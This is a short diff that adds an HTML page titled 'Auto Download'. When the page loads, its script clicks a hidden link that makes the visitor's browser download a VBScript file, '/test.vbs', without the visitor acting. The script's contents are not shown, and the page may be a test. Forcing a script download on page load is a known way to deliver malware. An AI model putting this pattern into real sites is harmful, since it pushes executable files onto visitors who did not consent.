@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Download</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            const a = document.createElement('a');
+            a.href = '/test.vbs';
+            a.download = 'test.vbs';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        };
+    </script>
+</body>
+</html>
